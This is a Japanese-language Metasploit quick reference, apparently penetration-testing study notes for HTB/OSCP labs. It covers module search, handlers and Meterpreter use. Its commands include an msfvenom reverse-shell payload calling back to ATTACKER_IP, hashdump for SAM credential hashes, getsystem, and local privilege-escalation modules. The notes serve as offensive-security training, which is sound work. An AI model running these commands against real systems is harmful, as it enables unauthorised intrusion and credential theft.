# Metasploit Framework クイックリファレンス

> **スコープ**: msfconsole でのモジュール探索フロー・パラメータ設定・handler の仕組みとエラー読み分けを扱う。各 CVE の具体的な実行コマンドは対応する技術ファイルを参照。

## 着火条件

- `searchsploit` / NVD でヒットした CVE に Metasploit モジュールが存在する
- 演習環境（HTB / OSCP 等）で msf 枠を使ってよいと判断した場合（試験によっては Metasploit 利用に制限がある — 他ターゲット向けに手動経路も必ず持つ）

## 環境前提

- 実行環境: テスター端末
- 必要なツール: `msfconsole`（ペネトレ用 Linux ディストリ標準搭載）
- 外部リソース依存: なし（ローカル DB は `/usr/share/metasploit-framework/modules/`）

## 先に確認すること

- **LHOST は必ず明示する**（未設定時に NAT / docker bridge を誤選択して no session になる — 後述）
- **msf モジュールを使う場合は nc を同じ LPORT で立てない**（handler との競合 — 後述）

---

## 1. モジュール探索フロー

**攻撃者の思考トレース:** `searchsploit` で候補を絞ってから msf 内を検索する。`search` は名前・説明・CVE 番号を横断するので製品名＋版数、または CVE 番号で絞り込む。

**コマンド:**

```bash
# [Attacker] msfconsole 起動
msfconsole

# [Attacker] モジュール検索（製品名 + バージョン、または CVE 番号）
msf > search <製品名> <バージョン>
msf > search cve:<YEAR>-<ID>
# 例: search samba 3.0  /  search cve:2007-2447  /  search distcc
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `# Name ... Rank Description` の一覧 | 候補一覧 | `use <番号>` または `use <フルパス>` |
| 0 件 | msf にモジュールが無い | GitHub / Exploit-DB で手動 PoC を探す（`../05_Tools_Reference/Searchsploit.md` 参照） |

**注意:** 同一 CVE に複数モジュールがある場合は Rank（excellent > great > good > normal）が高いものを優先する。

---

## 2. モジュール選択・設定・実行

**コマンド:**

```bash
msf > use <N>                         # 番号またはフルパスで選択
msf > info                            # 説明・前提条件・影響範囲を確認（必ず読む）
msf > show options                    # Required: yes の項目を確認
msf > show payloads                   # 利用可能なペイロード（省略時はデフォルト）

msf > set RHOSTS [TARGET_IP]          # ターゲット IP
msf > set LHOST [ATTACKER_IP]         # ← 必ず明示（後述）
msf > set LPORT [PORT]                # リスナーポート（省略時 4444）
msf > run
```

### LHOST を必ず明示する理由

msf は LHOST 未設定時にシステムのデフォルトルートのインターフェースを自動選択する。**VPN・NAT・docker bridge が混在する環境では、ターゲットから到達できないインターフェースを選ぶことがある。**

```bash
# [Attacker] 到達可能インターフェースを確認してから set する
ip a                                  # 全インターフェース表示
# ターゲットまでのルーティング経路（VPN / 物理 LAN 等）に対応する IP を選ぶ
# → どのインターフェースを選ぶかの判断: ../06_Concepts/Reverse_Shell.md「攻撃側の準備①」

msf > set LHOST [ATTACKER_IP]         # IP 直書き
msf > set LHOST [IF_NAME]             # または IF 名で渡す（IP が変わっても自動更新。名前は ip a で確認）
```

---

## 3. handler の仕組みと nc との住み分け

リバースシェルを取るモジュールは **msf が内部でリスナー（handler）を自動起動する**。

```
[msf run]
  → [msf が LHOST:LPORT で listen 開始]
  → [ペイロードをターゲットに送信]
  → [ターゲットが LHOST:LPORT に接続]
  → [msf の handler がセッションを受け取る]
```

> **同じ LPORT で nc を先に起動すると msf が bind できず即中断する。**  
> msf モジュールを使う場合は nc を立てない。nc が必要なのは手動 PoC 経路の場合のみ。

| 経路 | リスナー起動 |
|---|---|
| 手動 PoC / スクリプト / コマンドインジェクション | `nc -lvnp [PORT]` を自分で先に起動 |
| msf モジュール（reverse 系 payload） | **nc を立てない** — msf が `run` 時に自動起動 |

### 3.1 multi/handler — 自前で配布したペイロードを受ける

`msfvenom` で生成したペイロード（webshell / アップロード / FTP 書込 / コマンド注入で**外部経由で**ターゲットに配置・実行させたもの）は、exploit モジュールを使っていないので handler が自動起動しない。**`use exploit/multi/handler` で受信側だけを立てる**。

**コマンド:**

```bash
# [Attacker] 配布するペイロードを生成（payload は handler と完全一致させる）
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[ATTACKER_IP] LPORT=[PORT] -f aspx > shell.aspx

# [Attacker] 受信側 handler を起動（payload / LHOST / LPORT を msfvenom と一致させる）
msfconsole -q -x "use exploit/multi/handler; \
  set payload windows/meterpreter/reverse_tcp; \
  set LHOST [ATTACKER_IP]; set LPORT [PORT]; \
  set ExitOnSession false; exploit -j"
# → 別経路（ブラウザで .aspx を開く等）でペイロードを実行させると session が開く
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `exploit -j` 後すぐ `Exploit completed, but no session was created` | **エラーではない** — `-j` はジョブとして listen を開始して即プロンプトに戻るだけ。この後に `Sending stage` → `session opened` が続く | ペイロードを実行させて session を待つ |
| `Meterpreter session N opened` | 受信成功 | §5 / §6 / §7 へ |
| いつまでも session が開かない | payload 不一致 / LHOST 誤 IF / FW | payload を msfvenom と一致させる・`ip a` で LHOST 確認・§3.2 を確認 |

**注意:** handler の `payload` / `LHOST` / `LPORT` は **msfvenom で作ったものと完全一致**させる。1 つでもズレると stager は接続できても session 化しない。

### 3.2 staged と stageless — nc で meterpreter を受けられない理由

ペイロードには 2 方式があり、**受信側の要件が違う**。これを知らないと「nc で待ち受けたのに meterpreter が来ない」で詰まる。

| 方式 | payload 名の見分け | 動作 | nc で受けられるか |
|---|---|---|---|
| **staged（段階型）** | 区切りが `/`：`windows/meterpreter/reverse_tcp` | 小さな stager だけ送り込み、接続後に **handler が stage 本体（数百 KB の meterpreter DLL）を送り返す** | **不可**（nc は stage を送り返せない） |
| **stageless（一体型）** | 区切りが `_`：`windows/meterpreter_reverse_tcp` / `windows/shell_reverse_tcp` | ペイロード全体を 1 度に送る。接続したら即シェル | shell 系なら **可**（生の cmd パイプ） |

**判断:**

- **staged meterpreter（`.../reverse_tcp`）を生成したなら、受信は必ず `multi/handler`**。`nc -lvnp` で待ち受けると、stager は接続してくるが handler が居ないので stage を受け取れず、セッションにならない（`Sending stage` が出ない／接続が即死する）。
- **nc で受けたいなら、stageless の素のシェルを生成する**：`msfvenom -p windows/shell_reverse_tcp LHOST=.. LPORT=.. -f aspx`。これは meterpreter ではなく cmd.exe の生パイプなので nc で対話できる（ただし meterpreter の便利機能は使えない）。
- ログで `Sending stage (NNNNNN bytes)` が出ていれば staged を handler が正しく受けている証拠。

> **よくある失敗（実際に起きる）:** staged meterpreter を `msfvenom` で作り、`nc -lvnp [PORT]` で待ち受け → ブラウザで webshell を開くと nc に接続は来るが無反応。nc を閉じて `multi/handler` を同じ payload/LPORT で立て直し、もう一度 webshell を開けば session が開く。

---

## 4. エラー読み分け表

**コマンド:**

```bash
# run 後のコンソール出力でエラーを読み分ける
```

**観測される出力 → 次のアクション:**

| 出力 | 原因 | 対処 |
|---|---|---|
| `Handler failed to bind ... address already in use` | 同じ LPORT を nc または他プロセスが既に占有 | `ss -tlnp \| grep [PORT]` で確認 → 占有プロセスを止めるか `set LPORT [別ポート]` |
| `Started reverse TCP handler on [NAT/bridge IP]` → `Exploit completed, but no session` | LHOST 未設定 or 誤 IF 選択。ターゲットから到達できない IF が選ばれた | `set LHOST [到達可能 IP または IF 名]` で再実行（`ip a` で確認） |
| `Exploit failed [unreachable]: Rex::HostUnreachable` | RHOSTS の IP に到達できない（IP タイポ・ルート不備） | RHOSTS を確認 → `ping [TARGET_IP]` / `nmap -p [PORT] [TARGET_IP]` で疎通確認 |
| `Exploit completed, but no session`（handler が正しい IP で起動している） | ペイロードは送れたが戻りが FW でブロック | LPORT を 443 / 80 に変更 / `show payloads` で bind shell に切替 |
| `No payload configured, defaulting to cmd/unix/reverse_bash`（既定ペイロードはモジュールにより異なる） | ペイロード未設定の情報メッセージ（エラーではない） | そのまま run でよい。変更したい場合は `set payload <path>` |

---

## 5. Meterpreter セッション基礎

**着火条件:** 既定ペイロード（`windows/meterpreter/reverse_tcp` 等）でセッションが開いた直後。プロンプトが `meterpreter >` になっている。

> **【最重要】プロンプトを取り違えない（3 種類ある）:** msf 操作中は **3 つのプロンプト**が出てくる。どこにいるかで「コマンドが誰に対して実行されるか」が変わる。
>
> | プロンプト | コマンドの実行先 | ターゲットを触れるか |
> |---|---|---|
> | `msf exploit(...) >`（msfconsole） | **未知のコマンドはテスター端末（手元）のローカルシェルに渡される** | ✕ |
> | `meterpreter >` | ターゲット（meterpreter 専用コマンド経由） | ○ |
> | `C:\> ` 等（`shell` で落ちた OS シェル） | ターゲット（OS コマンド） | ○ |
>
> **典型的な取り違え（実際に起きる）:**
> - `msf exploit(multi/handler) >` の状態で `whoami` と打つと、**ターゲットではなく手元の端末で `whoami` が走り、自分のローカルユーザー名が返る**（msfconsole が未知コマンドをローカルシェルにパススルーするため。`[*] exec: whoami` と表示されるのが目印）。`dir` も同様に**手元のディレクトリ**が出る。
> - 同じ msf プロンプトで `getuid` と打つと `Unknown command: getuid`（getuid は meterpreter コマンドで msfconsole コマンドではない）。
> - **ターゲットを触るには必ず `sessions -i [ID]` でセッションに入ってから**（`meterpreter >` になる）。`sessions -l` で一覧、`Information` 列にターゲットのユーザー（例: `IIS APPPOOL\Web @ [HOSTNAME]`）が出る。

> **meterpreter は OS のシェルそのものではない。** `meterpreter >` でも `id` / `whoami` などの OS コマンドをそのまま打つと `Unknown command: id` のように弾かれる。meterpreter 専用コマンド（`getuid` 等）で操作するか、`shell` で OS シェルに落ちてから OS コマンドを打つ。

**コマンド:**

```bash
meterpreter > getuid          # 現在の権限（例: NT AUTHORITY\SYSTEM）。OS の whoami の代わり
meterpreter > sysinfo         # OS / ビルド / アーキ / ドメイン参加の有無
meterpreter > getsystem       # まだ SYSTEM でなければ権限昇格を試行
meterpreter > hashdump        # SAM ハッシュ（要 SYSTEM）→ PtH / クラックへ
meterpreter > shell           # OS のコマンドシェルに落ちる（cmd.exe / /bin/sh）
meterpreter > background      # セッションを保持したまま msf プロンプトへ戻る
msf > sessions -i [SESSION_ID]  # background したセッションに再アタッチ
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `getuid` が `NT AUTHORITY\SYSTEM` | ローカル最高権限を取得済み | 侵入後列挙へ（`../04_Post_Access_Windows_AD/Enumeration_Checklist.md`）・`hashdump` で横展開の起点に |
| `getuid` が一般ユーザー | 権限昇格が必要 | `getsystem` → 失敗なら侵入後の権限昇格列挙へ |
| `sysinfo` の `Domain:` がワークグループ名 | スタンドアロン（非 AD） | ローカル資産の探索に集中 |
| `sysinfo` の `Domain:` が AD ドメイン名 | ドメイン参加ホスト | AD フロー（`../00_Playbook/Windows_AD_Attack_Flow.md`）へ合流 |

**注意（古い Windows の罠）:** `shell` で OS シェルに落ちた後に `whoami` で権限確認しようとすると、**Windows XP / 2000 では `'whoami' is not recognized` になる**（`whoami.exe` は Windows Server 2003 / Vista 以降で標準同梱。XP / 2000 には既定で入っていない）。古い Windows での権限確認の代替手段:

```cmd
echo %USERNAME%      :: SYSTEM 権限ではマシンアカウント名 [HOSTNAME]$ が返る（＝SYSTEM 取得の傍証）
net user             :: ローカルアカウント一覧
```

最も確実なのは `shell` を抜けて（`exit`）meterpreter 側に戻り `getuid` を使うこと。meterpreter は対象 OS の `whoami` の有無に依存せず権限を返す。

---

## 6. Meterpreter のファイル操作とパス指定（`\\` エスケープ）

**着火条件:** `meterpreter >` でターゲットのファイルを `cat` / `ls` / `download` するとき。

> **なぜ `\` を二重にするのか:** meterpreter のコマンド行は **`\` をエスケープ文字として解釈する**（Ruby のトークナイザ由来）。`c:\Users\[USER]` と書くと `\U` 等がエスケープとして食われ、パスが壊れて `The system cannot find the file specified` になる。**クォートで囲んでもエスケープは効く**ため、次のどちらかで書く:
>
> - **バックスラッシュを二重に**：`cat "c:\\Users\\[USER]\\Desktop\\[FILE]"`
> - **スラッシュに置き換える**（Windows パスでも meterpreter は受け付ける）：`cat "c:/Users/[USER]/Desktop/[FILE]"`

**コマンド:**

```bash
# [Target/meterpreter] まず ls で実ファイル名を確認してから cat する
meterpreter > ls "c:\\Users\\[USER]\\Desktop\\"
meterpreter > cat "c:\\Users\\[USER]\\Desktop\\[FILE]"
# または スラッシュ表記
meterpreter > cat "c:/Users/[USER]/Desktop/[FILE]"

# [Target/meterpreter] ファイル取得・環境変数展開
meterpreter > download "c:\\Users\\[USER]\\Desktop\\[FILE]"
meterpreter > cd %TEMP%        # 環境変数は %VAR% で展開できる
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `cat` が `stdapi_fs_stat: Operation failed: The system cannot find the file specified` | パスのエスケープ崩れ **または** ファイル名違い | `\\` / `/` で書き直す → それでも出なければ親ディレクトリを `ls` して実名を確認 |
| `[-] ... is a directory` | ディレクトリを `cat` した | `ls` に変える |
| `ls` で想定と違うファイル名（拡張子が違う等） | 参考にした手順書のパスを鵜呑みにしていた | **手順書のパスを盲信せず、必ず `ls` で実名を確認してから `cat`** する |

**注意:** 既存の writeup / 他人の手順のパスをそのままコピーして失敗するのは頻出パターン。OS の表示設定（既知の拡張子を隠す等）で「画面上のファイル名」と「実ファイル名」がずれることもある。`ls` で確定 → `cat`/`download` の順を徹底する。

---

## 7. セッションからの権限昇格探索（local_exploit_suggester / local exploit）

**着火条件:** 低権限のセッションを取得済み（例: サービスアカウント）で、ローカル権限昇格の候補を探したい。

**攻撃者の思考トレース:** 「今あるセッション・今ある情報から、どの昇格 exploit が効くか」を探す起点が `sysinfo`。**OS 版数・ビルド・アーキ（x86 / x64）** を押さえてから候補を列挙する。`local_exploit_suggester` はセッション越しにローカル昇格 exploit 群との突合を自動化してくれる（**x86 は判定が比較的信頼でき、x64 は精度が落ちる**）。

**コマンド:**

```bash
# [Target/meterpreter] まず素性を確認（アーキ・OS 版数・ビルドが選定の軸）
meterpreter > getuid          # 今の権限（例: サービスアカウントで非管理者）
meterpreter > sysinfo         # OS / Build / Architecture（x86 か x64 か）

# [Attacker/msf] セッションを背景化して suggester にかける
meterpreter > background
msf > use post/multi/recon/local_exploit_suggester
msf > set SESSION [ID]
msf > run
# → "appears to be vulnerable" の候補が列挙される

# [Attacker/msf] 候補から 1 つ選んで local exploit を実行（新しい昇格済みセッションが開く）
msf > use exploit/windows/local/[SUGGESTED_MODULE]
msf > set SESSION [ID]
msf > set LHOST [ATTACKER_IP]
msf > set LPORT [別ポート]      # 既存 handler と別ポートにする
msf > run
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `[+] ... appears to be vulnerable` の一覧 | **候補であって確証ではない**。複数出るのが普通 | 上から順に試す（信頼性・副作用の小さいものを優先） |
| `bypassuac_*` 系が候補に出る | UAC バイパスは**対象アカウントが Administrators 所属である前提** | サービスアカウント等の非管理者では失敗する → kernel / token 系の候補へ |
| local exploit 実行後 `Meterpreter session N opened` → `getuid` が `NT AUTHORITY\SYSTEM` | 昇格成功 | `../04_Post_Access_Windows_AD/Enumeration_Checklist.md`（昇格後の横展開観点） |
| local exploit が `Exploit aborted ... not writable` / ファイル書込で失敗 | local exploit は**ターゲットにファイルを書く**。既定 cwd が書込不可（IIS 等のサービスは `c:\windows\system32\inetsrv` 等） | 先に書込可能ディレクトリへ移動：`meterpreter > cd %TEMP%`（または `cd c:\\windows\\temp`）してから再実行 |

**注意:** `local_exploit_suggester` の結果は **searchsploit / 手動列挙の置き換えではなく入口**。kernel 系 exploit は不発時にターゲットを不安定化（BSOD）させうるので、`whoami /priv`（token 系昇格の可否）やサービス・スケジュールタスクの設定不備など、より低リスクな経路も並行で確認する → `../04_Post_Access_Windows_AD/Enumeration_Checklist.md`。書込可能 cwd の事前確認（`echo test > %TEMP%\test.txt`）も同チェックリスト参照。

---

## 刺さらなかったとき（全体）

| 状況 | 推定原因 | 代替手段 |
|---|---|---|
| msf モジュール自体が存在しない | Exploit-DB 未掲載 / 古い msf DB | `sudo msfdb update` でモジュール更新 → GitHub で手動 PoC を探す（`Searchsploit.md` 参照） |
| モジュールはあるが不発 | 前提条件の未充足（設定オプション・OS・版数） | `info` の Description / References を読んで前提を確認 → 手動 PoC に切替 |
| セッションを取れた直後にターゲットが再起動 | 古いサービスへの exploit が不安定 | 演習環境では session 取得直後に `background` して結果を保存 |

## 注意点・落とし穴

> **[HIGH IMPACT]** msf のシェル取得系 exploit は本番では原則禁止または個別合意必須：
> - [x] 意図しないサービスクラッシュ・業務停止リスク
> - [ ] 持続化（セッション自体は一時的だが痕跡は残る）
> - [x] SIEM / IDS で検知される（msf デフォルト payload のシグネチャは IDS に登録済み）
>
> 演習環境（HTB / OSCP 等）では制約なし。

### 本番での前提

- **事前合意の要否**: ★★★（書面承認必須 — シェル取得系 exploit 全般）
- **想定される SIEM / IDS 検知**: デフォルト payload の通信パターン・シグネチャ
- **業務影響リスク**: 古いサービスへの exploit 試行によるクラッシュ
- **演習環境での扱い**: 制約なし（HTB / OSCP 等は本セクション全項目をスキップしてよい）

## 関連技術

- 前：版数 → CVE 照合 → msf モジュール特定 → `Searchsploit.md`
- 前：msfvenom で作った webshell の言語選択・配布（§3.1 multi/handler で受信） → `../02_Initial_Access/Web_Vulnerabilities/Web_Shells.md`
- 後：msf セッション安定化 → `../03_Post_Access_Linux/Shell_Stabilization.md`
- 後：§7 local exploit で SYSTEM 取得後の Windows 列挙・横展開 → `../04_Post_Access_Windows_AD/Enumeration_Checklist.md`
- 関連：リバースシェルの原理・LHOST インターフェース選択 → `../06_Concepts/Reverse_Shell.md`
- 関連：usermap_script モジュールの例 → `../02_Initial_Access/Samba_Exploitation.md`
- 関連：distcc_exec モジュールの例 → `../02_Initial_Access/distcc_Exploitation.md`
